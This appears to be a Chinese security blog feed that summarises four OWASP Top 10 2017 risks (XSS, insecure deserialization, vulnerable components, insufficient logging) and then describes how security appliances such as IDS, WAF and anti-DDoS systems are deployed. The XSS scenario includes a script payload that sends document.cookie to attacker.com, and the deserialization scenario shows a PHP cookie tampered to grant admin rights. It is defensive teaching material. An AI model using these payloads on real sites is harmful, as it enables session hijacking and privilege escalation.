跨站脚本（XSS）</h1><p>当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。 XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</p><h2 id="漏洞成因-7"><a class="markdownIt-Anchor" href="#漏洞成因-7"></a> 漏洞成因</h2><p>存在三种XSS类型，通常针对用户的浏览器：<br /><strong>反射式XSS</strong>： 应用程序或API包括未经验证和未经转义的用户输入，作为HTML输出的一部分。一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的HTML和JavaScript。 通常，用户将需要与指向攻击者控制页面的某些恶意链接进行交互，例如恶意漏洞网站，广告或类似内容。<br /><strong>存储式XSS：</strong> 你的应用或者API将未净化的用户输入存储下来了，并在后期在其他用户或者管理员的页面展示出来。 存储型XSS一般被认为是高危或严重的风险。<br /><strong>基于DOM的XSS</strong>： 会动态的将攻击者可控的内容加入页面的JavaScript框架、单页面程序或API存在这种类型的漏洞。理想的来说，你应该避免将攻击者可控的数据发送给不安全的JavaScript<br />API。<br />典型的XSS攻击可导致盗取session、账户、绕过MFA、 DIV替换、对用户浏览器的攻击（例如：恶意软件下载、键盘记录）以及其他用户侧的攻击。</p><h2 id="检测方法-5"><a class="markdownIt-Anchor" href="#检测方法-5"></a> 检测方法</h2><p>自动化工具能自动发现一些XSS问题，特别是在一些成熟的技术中，如： PHP、 J2EE或JSP、 <a href="http://ASP.NET" target="_blank" rel="noopener">ASP.NET</a></p><h2 id="危害-7"><a class="markdownIt-Anchor" href="#危害-7"></a> 危害</h2><p>XSS对于反射和DOM的影响是中等的，而对于存储的XSS， XSS的 影响更为严重，譬如在受攻击者的 浏览器上执行远程代码，例如：窃取凭证和会话或传递恶意软件等。</p><h2 id="攻击案例场景-7"><a class="markdownIt-Anchor" href="#攻击案例场景-7"></a> 攻击案例场景</h2><p>场景#1： 应用程序在下面HTML代码段的构造中使用未经验证或转义的不可信的数据：</p><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">(String) page +&#x3D; &quot;&lt;input name&#x3D;&#39;creditcard&#39; type&#x3D;&#39;TEXT‘<br>value&#x3D;&#39;&quot; + request.getParameter(&quot;CC“) + &quot;&#39;&gt;&quot;;<br></code></pre></td></tr></table></figure><p>攻击者在浏览器中修改“CC” 参数为如下值：</p><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">&#39;&gt;&lt;script&gt;document.location&#x3D;<br>&#39;http:&#x2F;&#x2F;www.attacker.com&#x2F;cgi-bin&#x2F;cookie.cgi?<br>foo&#x3D;&#39;+document.cookie&lt;&#x2F;script&gt;&#39;.<br></code></pre></td></tr></table></figure><p>这个攻击导致受害者的会话ID被发送到攻击者的网站， 使得攻击者能够劫持用户当前会话。<br />注意：攻击者同样能使用跨站脚本攻破应用程序可能使用的任何跨站请求伪造（ CSRF） 防御机制。 CSRF的详细情况见2013年版中的A8项。</p><h2 id="预防措施-7"><a class="markdownIt-Anchor" href="#预防措施-7"></a> 预防措施</h2><p>防止XSS需要将不可信数据与动态的浏览器内容区分开。 这可以通过如下步骤实现：</p><ul><li>使用设计上就会自动编码来解决XSS问题的框架，如： Ruby 3.0或 React JS。了解每个框架的XSS保护的局限性，并适当地处理未覆盖的用例。</li><li>为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML输出的上下文（包括：主体、属性、 JavaScript、 CSS或URL）对所有不可信的HTTP请求数据进行恰当的转义 。 更多关于数据<br />转义技术的信息见： 《OWASP Cheat Sheet ‘XSS Prevention’》</li><li>在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的选择是实施上下文敏感数据编码。 如果这种情况不能避免，可以采用《OWASP Cheat Sheet ‘DOM based XSS Prevention ‘》描述的类似上下文敏感的转义技术应用于浏览器API。</li><li>使用内容安全策略（CSP） 是对抗XSS的深度防御策略。如果不存在可以通过本地文件放置恶意代码的其他漏洞（例如：路径遍历覆盖和允许在网络中传输的易受攻击的库），则该策略是有效的。</li></ul><h1 id="不安全的反序列化"><a class="markdownIt-Anchor" href="#不安全的反序列化"></a> 不安全的反序列化</h1><p>不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</p><h2 id="漏洞成因-8"><a class="markdownIt-Anchor" href="#漏洞成因-8"></a> 漏洞成因</h2><p>如果反序列化进攻者提供的敌意或者篡改过的对象将会使将应用程序和API变的脆弱。<br />这可能导致两种主要类型的攻击 ：</p><ul><li>如果应用中存在可以在反序列化过程中或者之后被改变行为的类，则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。我们将其称为对象和数据结构攻击。</li><li>典型的数据篡改攻击，如访问控制相关的攻击，其中使用了现有的数据结构，但内容发生了变化。</li></ul><p>在应用程序中，序列化可能被用于:</p><ul><li>远程和进程间通信（RPC / IPC）</li><li>连线协议、 Web服务、消息代理</li><li>缓存/持久性</li><li>数据库、缓存服务器、文件系统</li><li>HTTP cookie、 HTML表单参数、 API身份验证令牌</li></ul><h2 id="检测方法-6"><a class="markdownIt-Anchor" href="#检测方法-6"></a> 检测方法</h2><p>依靠经验进行检测</p><h2 id="漏洞位置-6"><a class="markdownIt-Anchor" href="#漏洞位置-6"></a> 漏洞位置</h2><p>底层代码</p><h2 id="危害-8"><a class="markdownIt-Anchor" href="#危害-8"></a> 危害</h2><p>反序列化缺陷的影响不能被低估。它们可能导致远程代码执行攻击，这是 可能发生的最严重的攻击之一。 业务影响取决于应用程序和数据的保护需求。</p><h2 id="攻击案例场景-8"><a class="markdownIt-Anchor" href="#攻击案例场景-8"></a> 攻击案例场景</h2><p>场景 #1：一个React应用程序调用了一组Spring Boot微服务。作为功能性程序员，他们试图确保他们的代码是不可变的。他们提出的解决方法是序列化用户状态，并在每次请求时来回传。攻击者注意到了“R00” Java对象签名，并使用Java Serial Killer工具在应用服务器上获得远程代码执行。<br />场景 #2：一个PHP论坛使用PHP对象序列化来保存一个“超级” cookie。该cookie包含了用户的用户ID、角色、密码哈希和其他状态：<br />a:4:{i:0;i:132;i:1;s:7:“Mallory”;i:2;s:4:“user”;i:3;s:32:“b6a8b3bea87fe0e05022f8f3c88bc960”;}<br />攻击者更改序列化对象以授予自己为admin权限：<br />a:4:{i:0;i:1;i:1;s:5:“Alice”;i:2;s:5:“admin”;i:3;s:32:“b6a8b3bea87fe0e05022f8f3c88bc960”;}</p><h2 id="预防措施-8"><a class="markdownIt-Anchor" href="#预防措施-8"></a> 预防措施</h2><p>唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化媒体。</p><p>如果上述不可能的话，考虑使用下述方法：</p><ul><li>执行完整性检查，如：任何序列化对象的数字签名，以防止恶意对象创建或数据篡改。</li><li>在创建对象之前强制执行严格的类型约束，因为代码通常被期望成一组可定义的类。绕过这种技术的方法已经被证明，所以完全依赖于它是不可取的。</li><li>如果可能，隔离运行那些在低特权环境中反序列化的代码。</li><li>记录反序列化的例外情况和失败信息，如：传入的类型不是预期的类型，或者反序列处理引发的例外情况。</li><li>限制或监视来自于容器或服务器传入和传出的反序列化网络连接。</li><li>监控反序列化，当用户持续进行反序列化时，对用户进行警告。</li></ul><h1 id="使用含有已知漏洞的组件"><a class="markdownIt-Anchor" href="#使用含有已知漏洞的组件"></a> 使用含有已知漏洞的组件</h1><p>组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p><h2 id="漏洞成因-9"><a class="markdownIt-Anchor" href="#漏洞成因-9"></a> 漏洞成因</h2><p>如果你不知道所有使用的组件版本信息（包括：服务端和客户端）。这包括了直接使用的组件或其依赖的组件。</p><ul><li>如果软件易受攻击，不再支持或者过时。这包括： OS、 Web服务器、应用程序服务器、数据库管理系统（DBMS）、应用程序、API和所有的组件、运行环境和库。</li><li>如果你不会定期做漏洞扫描和订阅你使用组件的安全公告。</li><li>如果你不基于风险并及时修复或升级底层平台、框架和依赖库。很可能发生这种情况：根据变更控制，每月或每季度进行升级，这使得组织在这段时间内会受到已修复但未修补的漏洞的威胁。</li><li>如果软件工程师没有对更新的、升级的或打过补丁的组件进行兼容性测试。</li><li>如果你没有对组件进行安全配置（请参考“A6:2017-安全配置错误”）。</li></ul><h2 id="检测方法-7"><a class="markdownIt-Anchor" href="#检测方法-7"></a> 检测方法</h2><p>如Retire.js之类的扫描器可以帮助发现此类漏洞，但这 类漏洞是否可以被利用还需花费额外的时间去研究。</p><h2 id="危害-9"><a class="markdownIt-Anchor" href="#危害-9"></a> 危害</h2><p>虽然对于一些已知的漏洞其影响很小， 但目前很多严重的安全事件都是利用组件中的已知漏洞。根据你所要保护的资产，此类风险等级可能会很高。</p><h2 id="攻击案例场景-9"><a class="markdownIt-Anchor" href="#攻击案例场景-9"></a> 攻击案例场景</h2><p>场景 #1： 很多时候组件都是以与应用相同的权限运行的，这使得组件里的缺陷可能导致各式各样的问题。这些缺陷可能是偶然的（如：编码错误），也可能是蓄意的（如：组件里的后门）。下面是一些已被利用的漏洞：<br />• CVE-2017-5638，一个Struts2远程执行漏洞。 可在服务端远程执行代码，并已造成巨大的影响。<br />• 虽然物联网（IoT） 设备一般难以通过打补丁来修复。但对之打补丁非常重要（如：医疗设备）。<br />有些自动化工具能帮助攻击者发现未打补丁的或配置不正确的系统。例如 ： Shodan IOT搜索引擎能帮助你发现从2014年四月至今仍存在心脏出血漏洞 的设备。</p><h2 id="预防措施-9"><a class="markdownIt-Anchor" href="#预防措施-9"></a> 预防措施</h2><ul><li><p>移除不使用的依赖、不需要的功能、组件、文件和文档。</p></li><li><p>利用如 versions、 DependencyCheck 、 retire.js等工具来持续的记录客户端和服务器端以及它们的依赖库的版本信息。持续监控如CVE 和 NVD等是否发布已使用组件的漏洞信息，可以使用软件分析工具来自动完成此功能。订阅关于使用组件安全漏洞的警告邮件。</p></li><li><p>仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险</p></li><li><p>监控那些不再维护或者不发布安全补丁的库和组件。如果不能打补丁，可以考虑部署虚拟补丁来监控、检测或保护。</p></li></ul><pre><code>每个组织都应该制定相应的计划，对整个软件生命周期进行监控、评审、升级或更改配置。  </code></pre><h1 id="不足的日志记录和监控"><a class="markdownIt-Anchor" href="#不足的日志记录和监控"></a> 不足的日志记录和监控</h1><p>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</p><h2 id="漏洞成因-10"><a class="markdownIt-Anchor" href="#漏洞成因-10"></a> 漏洞成因</h2><p>下列情况会导致不足的日志记录、检测、监控和响应 ：</p><ul><li>未记录可审计性事件，如：登录、登录失败和高额交易。<br />告警和错误事件未能产生或产生不足的和不清晰的日志信息。</li><li>没有利用应用系统和API的日志信息来监控可疑活动。</li><li>日志信息仅在本地存储。</li><li>没有定义合理的告警阈值和制定响应处理流程。</li><li>渗透测试和使用DAST工具（如： OWASP ZAP）扫描没有触发告警</li><li>对于实时或准实时的攻击，应用程序无法检测、处理和告警。</li></ul><p>如果你的应用使得日志信息或告警信息对用户或者攻击者可见，你就很容易遭受信息泄露攻击（请参考A3： 2017-敏感信息泄露）</p><h2 id="检测方法-8"><a class="markdownIt-Anchor" href="#检测方法-8"></a> 检测方法</h2><p>足够监控的一个策略是在渗透测试后检 查日志。 测试者的活动应被充分的记录下来，能够反 映出他们造成了什么样的影响。</p><h2 id="危害-10"><a class="markdownIt-Anchor" href="#危害-10"></a> 危害</h2><p>多数成功的攻击往往从漏洞探测开始。 允许这种探测会将攻击成功的可能性 提高到近100% 据统计，在2016年确定一起数据泄露 事件平均需要花191天时间，这么长时间里损害早已发生。</p><h2 id="攻击案例场景-10"><a class="markdownIt-Anchor" href="#攻击案例场景-10"></a> 攻击案例场景</h2><p>场景#1：一个由小团队运营的开源项目论坛软件被攻击者利用其内在漏洞攻陷了。 攻击者设法删除了包含下一个版本的内部源代码仓库以及所有论坛内容。 虽然代码可以恢复，但由于缺乏监控、日志记录和告警导致了更糟糕的结果。 由于此问题，该论坛软件项目不再活跃。<br />场景#2：攻击者使用通用密码进行用户扫描并能获取所有使用此密码的账户。对于其他账户而言，将仅有一次失败的登陆尝试记录。一段时间以后，攻击者可以用另一个密码再次进行此活动。<br />场景#3：美国的一家大型零售商据内部使用恶意软件分析沙箱做分析。 沙箱软件检测到了一些可能不需要的软件，但没有人响应此次检测。 在一个境外银行不正当的信用卡交易被检测到之前，该沙箱软件一直在产生告警信息。</p><h2 id="预防措施-10"><a class="markdownIt-Anchor" href="#预防措施-10"></a> 预防措施</h2><p>根据应用程序存储或处理的数据的风险：</p><ul><li>确保所有登录、访问控制失败、输入验证失败能够被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐户，并为后期取证预留足够时间。</li><li>确保日志以一种能被集中日志管理解决方案使用的形式生成</li><li>确保高额交易有完整性控制的审计信息，以防止篡改或删除，例如审计信息保存在只能进行记录增加的数据库表中。</li><li>建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对。</li><li>建立或采取一个应急响应机制和恢复计划，例如： NIST 800-61 rev 2或更新版本。</li></ul><p>目前已有商业的和开源的应用程序防护框架（例如： OWASP AppSensor）、 Web应用防火墙（例如 ： Modsecurity with the OWASP Core Rule Set）、带有自定义仪表盘和告警功能的日志关联软件。</p>]]></content>
      
      
      <categories>
          
          <category> 等级保护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全设备理论</title>
      <link href="/2020/11/22/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E7%90%86%E8%AE%BA/"/>
      <url>/2020/11/22/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E7%90%86%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="idsipsadssassas-hfwwaf"><a class="markdownIt-Anchor" href="#idsipsadssassas-hfwwaf"></a> IDS&amp;IPS&amp;ADS&amp;SAS&amp;SAS-H&amp;FW&amp;WAF</h2><h2 id="工作原理-接口模式-部署方式-典型部署位置"><a class="markdownIt-Anchor" href="#工作原理-接口模式-部署方式-典型部署位置"></a> 工作原理-接口模式-部署方式-典型部署位置</h2><h2 id="bvsrsaswvss"><a class="markdownIt-Anchor" href="#bvsrsaswvss"></a> BVS&amp;RSAS&amp;WVSS:</h2><h2 id="1-掌握评估工具的工作操作及原理-流程和部署方式"><a class="markdownIt-Anchor" href="#1-掌握评估工具的工作操作及原理-流程和部署方式"></a> 1、掌握评估工具的工作操作及原理、流程和部署方式</h2><h2 id="2-掌握设备操作之前注意事项"><a class="markdownIt-Anchor" href="#2-掌握设备操作之前注意事项"></a> 2、掌握设备操作之前注意事项</h2><h2 id="3-根据评估结果进行漏洞原理阐述掌握漏洞解决办法"><a class="markdownIt-Anchor" href="#3-根据评估结果进行漏洞原理阐述掌握漏洞解决办法"></a> 3、根据评估结果进行漏洞原理阐述，掌握漏洞解决办法</h2><h2 id="入侵检测系统ids"><a class="markdownIt-Anchor" href="#入侵检测系统ids"></a> <mark>入侵检测系统（IDS）</mark></h2><ul><li>工作原理</li></ul><p>对网络进行检测，提供对内部攻击、外部攻击和误操作的实时监控，提供动态保护</p><ol><li>数据收集：收集的数据包括主机日志、防火墙日志、数据库日志、应用程序数据以及网络数据包等；</li><li>数据处理：由于之前收集到的数据过于庞大和繁杂，需要对其进行相应的处理（去除冗余、噪声，并且进行数据标准化及格式化处理）；</li><li>数据分析：采用统计、智能算法能方法分析数据是否正常，显示是否存在入侵；行为</li><li>响应处理：当发现入侵行为时，采取预案措施进行防护（如切断网络，记录日志）、并保留入侵证据以作他日调查所用，同时向管理员报警。</li></ol><ul><li>接口模式</li></ul><p>开放式 IDBP（Intrusion Detection and Block Protocol）联动接口  、snmp trap  （V1、 V2、 V3）和 syslog 接口</p><ul><li>部署方式</li></ul><p>旁站部署、透明部署（所有网络）</p><ul><li>典型部署位置</li></ul><p>小型网络精细管理</p><p>中型网络集中管理</p><p>大型网络分级管理</p><h2 id="下一代防火墙nf"><a class="markdownIt-Anchor" href="#下一代防火墙nf"></a> 下一代防火墙(NF)</h2><ul><li>工作原理</li></ul><p>构筑于最新一代高速多核并行硬件平台之上  ，集入侵防护、防病毒、 URL过滤、内容过滤为一体的一体化安全引擎</p><ul><li>接口模式</li><li>部署方式</li></ul><p>同FW</p><ul><li><p>典型部署位置</p><p>互联网边界防护、 数据中心防护、远程安全互联等 3 种主要部署场景  （互联网区， DMZ 区、内网区  ）</p></li></ul><h2 id="防火墙fw"><a class="markdownIt-Anchor" href="#防火墙fw"></a> <mark>防火墙（FW）</mark></h2><h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3><p>防火墙是一个由计算机硬件和软件组成的系统，部署于网络边界，是内部网络和外部网络之前的连接桥梁，同时对进出网络边界的数据进行保护，防止恶意入侵、恶意代码的传播等，保障内部网络数据的安全</p><h3 id="接口模式"><a class="markdownIt-Anchor" href="#接口模式"></a> 接口模式</h3><p>标准 snmp trap（V1、 V2、 V3）和 syslog 接口</p><h3 id="部署方式"><a class="markdownIt-Anchor" href="#部署方式"></a> 部署方式</h3><ul><li><strong>路由模式</strong>-内部网络和外部网络之间</li><li><strong>透明模式</strong>-网络中像放置网桥（bridge）一样插入</li><li><strong>混合模式</strong>-既存在工作在路由模式的接口（接口具有IP 地址），又存在工作在透明模式的接口（接口无IP 地址）</li></ul><h3 id="典型部署位置"><a class="markdownIt-Anchor" href="#典型部署位置"></a> 典型部署位置</h3><ul><li>路由之后</li><li>关键位置之前</li><li>远程访问目标区域之前</li></ul><p>互联网区， DMZ 区、内网区  一般放在这些区域之间</p><h2 id="web应用防火墙waf"><a class="markdownIt-Anchor" href="#web应用防火墙waf"></a> <mark>WEB应用防火墙WAF</mark></h2><h3 id="原理-2"><a class="markdownIt-Anchor" href="#原理-2"></a> 原理</h3><ul><li>应用层设备</li><li>Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护</li></ul><p>WAF用黑名单白名单相结合的完整防护体系，通过精细化配置将多种web安全检测的方法连结成一整套完整的解决方案，并整合成熟的DDOS抵御机制能够在IPV4、IPV6以及混合环境中抵御OWASP TOP10等web安全威胁和DDOS</p><h3 id="接口模式-2"><a class="markdownIt-Anchor" href="#接口模式-2"></a> 接口模式</h3><p>缺省网络接口</p><h3 id="典型部署方式"><a class="markdownIt-Anchor" href="#典型部署方式"></a> 典型部署方式</h3><ul><li>透明部署模式</li><li>路由旁路监控模式</li><li>云部署</li></ul><h3 id="典型部署位置-2"><a class="markdownIt-Anchor" href="#典型部署位置-2"></a> 典型部署位置</h3><ul><li>工作在DMZ 区透明串联在防火墙和web服务器群方向对web服务器群的出入流量进行有效的监控</li><li>支持软硬件、BYPASS功能，在设备出故障时可用链路直连不影响业务的正常访问</li><li>对开关业务建设部署双机热备，避免单点故障隐患</li></ul><h2 id="抗拒绝服务攻击ads"><a class="markdownIt-Anchor" href="#抗拒绝服务攻击ads"></a> <mark>抗拒绝服务攻击（ADS）</mark></h2><h3 id="工作原理"><a class="markdownIt-Anchor" href="#工作原理"></a> 工作原理</h3><p>通过及时发现背景流量中各种类型的攻击流量</p><p><strong>绿盟抗拒绝服务产品</strong>基于嵌入式系统设计，在系统核心实现了防御拒绝服务攻击的算法，创造性地将算法实现在协议栈的最底层，避免了 TCP/UDP/IP 等高层系统网络堆栈的处理，使整个运算代价大大降低，并结合特有硬件加速运算</p><p>针对DDOS攻击，ADS通过及时发现背景流量中各种类型的攻击流量，ADS可以迅速对攻击流量进行过滤或旁路牵引，保证正常流量的通过</p><h3 id="接口模式-3"><a class="markdownIt-Anchor" href="#接口模式-3"></a> 接口模式</h3><h3 id="部署方式-2"><a class="markdownIt-Anchor" href="#部署方式-2"></a> 部署方式</h3><h4 id="串行方式"><a class="markdownIt-Anchor" href="#串行方式"></a> 串行方式</h4><p>部署在网络入口端</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/ADS%E4%B8%B2%E8%A1%8C.jpg" alt="" /></p><h4 id="旁路部署方式"><a class="markdownIt-Anchor" href="#旁路部署方式"></a> 旁路部署方式</h4><p>通常， 流量监测设备 NTA 部署在网络任意位置， ADS 设备“旁路”部署在网络入口。 NTA 设备主要对网络入口的流量提供监控功能，及时检测 DDoS 攻击的类型和来源。当发现 DDoS 攻击发生时， NTA 设备会及时通知 ADS 设备，随后由 ADS 设备启动流量牵引机制，从路由器或交换机处分流可疑流量至 ADS 设备，在完成 DDoS 攻击的过滤后， ADS再将“干净” 的流量注入回网络当中。</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/ADS%E6%97%81%E8%B7%AF%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F.jpg" alt="ADS旁路部署方式" /></p><h4 id="运营商三位一体部署方式"><a class="markdownIt-Anchor" href="#运营商三位一体部署方式"></a> 运营商三位一体部署方式</h4><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/%E8%BF%90%E8%90%A5%E5%95%86%E4%B8%89%E4%BD%8D%E4%B8%80%E4%BD%93%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F.jpg" alt="运营商三位一体部署方式" /></p><h3 id="典型部署位置-3"><a class="markdownIt-Anchor" href="#典型部署位置-3"></a> 典型部署位置</h3><h2 id="堡垒机sas-h"><a class="markdownIt-Anchor" href="#堡垒机sas-h"></a> <mark>堡垒机（SAS-H）</mark></h2><ul><li>工作原理</li></ul><p>通过<mark>集中账号管理、集中访问控制、集中安全审计</mark>实施安全审计</p><ul><li>接口模式</li></ul><p>单开、双开</p><ul><li>部署方式</li></ul><p>采用<mark>物理旁路，逻辑串联</mark>的模式</p><ul><li>典型部署位置</li></ul><p>小型网络精细审计</p><p>中级网络集中审计</p><p>大型网络分级审计</p><p>安全管理区、DMZ区、服务器区以及办公区</p><h2 id="安全审计系统sas"><a class="markdownIt-Anchor" href="#安全审计系统sas"></a> <mark>安全审计系统（SAS）</mark></h2><h3 id="工作原理-2"><a class="markdownIt-Anchor" href="#工作原理-2"></a> 工作原理</h3><p>运用各种技术手段实时收集和监控网络环境中每个组成部分的系统状态、安全事件，以便集中报警、分析、处理的一种技术手段（分类：日志审计、主机审计、网络审计）</p><h3 id="接口模式-4"><a class="markdownIt-Anchor" href="#接口模式-4"></a> 接口模式</h3><p>#console口、COM1口</p><p>M 口、 H1 口、G 口（即千兆口，包括 G1/1、 G1/2 等）和 T 口（即万兆口，包括 T1/1、 T1/2 等）</p><h3 id="部署方式-3"><a class="markdownIt-Anchor" href="#部署方式-3"></a> 部署方式</h3><p>旁路部署模式-支持多网段的同时监听</p><p>级联部署</p><h3 id="典型部署位置-4"><a class="markdownIt-Anchor" href="#典型部署位置-4"></a> 典型部署位置</h3><p>小型网络精细审计</p><p>中级网络集中审计</p><p>大型网络分级审计</p><p>安全管理区、DMZ区、服务器区以及办公区</p><h2 id="安全配置检查系统bvs"><a class="markdownIt-Anchor" href="#安全配置检查系统bvs"></a> <mark>安全配置检查系统（BVS）</mark></h2><h3 id="工作原理-3"><a class="markdownIt-Anchor" href="#工作原理-3"></a> 工作原理</h3><p>完善的安全配置库，采用高效、智能的识别技术，可以实现对网络资产设备自动化的安全配置检测、分析，并提供专业的安全配置建议与合规性报表</p><h3 id="部署位置"><a class="markdownIt-Anchor" href="#部署位置"></a> 部署位置</h3><p>内外网均可</p><h3 id="体系结构"><a class="markdownIt-Anchor" href="#体系结构"></a> 体系结构</h3><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20201118161410.png" alt="" /></p><h3 id="接口"><a class="markdownIt-Anchor" href="#接口"></a> 接口</h3><p>二次开发的数据接口、 A 接口、 SNMP Trap</p><h3 id="部署方式-4"><a class="markdownIt-Anchor" href="#部署方式-4"></a> 部署方式</h3><p>单机单网络、单机多网络、 安全平台分布式管理、跳板机跳转等多种部署方式</p><h4 id="独立式部署"><a class="markdownIt-Anchor" href="#独立式部署"></a> 独立式部署</h4><ul><li>网络中只部署一台BVS，将其接入网络进行正确的配置</li><li>适用于总线拓扑、星形拓扑</li></ul><h4 id="分布式部署"><a class="markdownIt-Anchor" href="#分布式部署"></a> 分布式部署</h4><ul><li>多台BVS同时工作，采用层次部署方式（上级节点管理多个下级节点），支持各系统间数据共享汇总</li><li>适用于树形拓扑、混合型拓扑</li></ul><h2 id="黑洞网络流量分析系统"><a class="markdownIt-Anchor" href="#黑洞网络流量分析系统"></a> 黑洞网络流量分析系统</h2><h3 id="目的"><a class="markdownIt-Anchor" href="#目的"></a> 目的</h3><ul><li>网络和业务规划相关的问题–关于网络流量成分组成以及地域分布的情况 （流量的来源与去向、流量的组成成分、流量的变化趋势）</li><li>网络安全运营相关的问题–关于异常流量的种类和数量、来源等情况</li></ul><p>流量分析的目的是解决以上两个问题。</p><h3 id="流量分析原理"><a class="markdownIt-Anchor" href="#流量分析原理"></a> 流量分析原理</h3><h4 id="数据采集"><a class="markdownIt-Anchor" href="#数据采集"></a> 数据采集</h4><p>分为Netflow、sFlow、SPAN、SNMP/RMON四种方式</p><h5 id="netflow"><a class="markdownIt-Anchor" href="#netflow"></a> Netflow</h5><p>工作机制：由路由器按照 7 元组条 件 在 缓 存 中 创 建 流 记 录，并按照一定触发条件定期输出流记录生成 包。由专用的采集程序 监听路由器发送过来的 流记录包，将数据包解 码就完成了数据采集的 环节</p><p>优势：支持此方式的设备较多。 可 以 含 有 二层 的 数 据 信 息。不用嵌入到用户电路中，进行采集。主要包含 数 据 包 的 三 层 和 二 层 信 息。同时也融入了对应的 路由信息（如 AS 号、 BGP 信息等</p><p>局限：路由器在输出流记录的时 候会有些延迟（要满足流结 束条件后才输出） 。流记录不包含包内容信息，无法 做深度检验。</p><h5 id="sflow"><a class="markdownIt-Anchor" href="#sflow"></a> sFlow</h5><p>工作机制：路由器按照物理端口对 随时将采样数据包的包 头信息输出</p><p>优势：输 出 信 息 中 包 括 二 层 数 据，没有流的起止概念， 随时将包头信息输出，实 时性较好</p><p>局限：输出信息都是单个数据包， 没有会话的概念，做数据分 析时需要做一定的聚合计 算。</p><h5 id="span"><a class="markdownIt-Anchor" href="#span"></a> SPAN</h5><p>工作机制：在网络设备上配置镜像 端口，用类似 Sniffer 的 方式采集来自镜像端口 的数据包</p><p>优势：输出信息包括应用层信息 和数据内容。输出信息的 实时性较好</p><p>局限：在大流量环境下（接口带宽 超过 2.5Gbps）很难满足数 据采集的性能要求。部署的 可扩展性差，需要在很多点 进行部署，造成成本加大。 输出信息仅限于数据包自 身携带的内容，无路由相关 信息。输出信息都是单个数 据包，没有会话的概念，做 数据分析时需要做一定的 聚合计算</p><h5 id="snmprmon"><a class="markdownIt-Anchor" href="#snmprmon"></a> SNMP/RMON</h5><p>工作机制：通过 SNMP 查询请求 获取数据</p><p>优势：采集方法简单，容易实现， 数据的呈现比较简单</p><p>局限：输出的流量信息内容过于 简单，通常只含有总流量的 信息。 SNMP 的优先级别 比较低，容易造成数据丢 失。 只能做面向设备的分析，无 法做面向业务的复杂分析。</p><p>SNMP/RMON和SPAN无法满足高带宽的要求，主流采用Netflow、sFlow作为主要流量采集手段，有特殊情况采用SPAN方式采集数据</p><p>流量数据包含信息三类：<strong>空间信息、时间信息、技术指标信息</strong></p><h4 id="数据分析"><a class="markdownIt-Anchor" href="#数据分析"></a> 数据分析</h4><p>异常流量的检测分为三个步骤：</p><ol><li>检测指标实测值的计算</li><li>检测指标基线值的计算</li><li>实测值与基线值的比较</li></ol><h4 id="结果呈现"><a class="markdownIt-Anchor" href="#结果呈现"></a> 结果呈现</h4><h3 id="架构"><a class="markdownIt-Anchor" href="#架构"></a> 架构</h3><p>整个体系分为三层：采集层、分析层、呈现层</p><p>绿盟流量分析系统使用动态基线检测异常流量，动态基线分为两种，一种是周期性基线，一种是移动窗口基线。</p><h3 id="典型部署方式-2"><a class="markdownIt-Anchor" href="#典型部署方式-2"></a> 典型部署方式</h3><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201119105250242.png" alt="image-20201119105250242" /></p><p>网络出口模式适用于城域网或各种专网的环境中。图中的四个网络出口路由器器之间采用全互联连接。用蓝色线表示。为了避免流量数据的重复采集，出口路由器之间互联的端口不要打开 Netflow。仅将上、下联端口的 Netflow 功能打开。</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201119105311849.png" alt="image-20201119105311849" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201119105336744.png" alt="image-20201119105336744" /></p><p>在园区网的环境下，用户可能关心各个子网间的流量，且分布层设备也不支持 Netflow，需要把每个接入层路由器的上联端口的流量镜像到 NTA CT600， NTA CT600 把流量转换成Netflow 数据并发送给 NTA SE2000。如果分布层设备支持 Netflow，则不需要 NTA CT600，接入层设备直接打开 Netflow 